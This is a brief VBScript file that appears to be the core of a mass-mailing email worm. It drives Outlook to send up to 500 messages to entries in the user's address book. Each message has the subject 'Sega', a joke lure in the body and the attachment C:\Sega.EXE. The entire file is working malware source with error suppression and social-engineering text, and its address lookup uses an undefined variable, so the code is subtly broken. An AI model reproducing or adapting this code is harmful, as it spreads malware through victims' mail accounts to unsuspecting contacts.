On Error Resume Next
Dim R
Set RS=CreateObject("Outlook.Application")
For R=1 To 500
Set Mail=RS.CreateItem(0)
Mail.to=RS.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="Sega"
Mail.Body="Take a look at this and just start laughing !"
Mail.Attachments.Add("C:\Sega.EXE")
Mail.Send
Next
RS.Quit

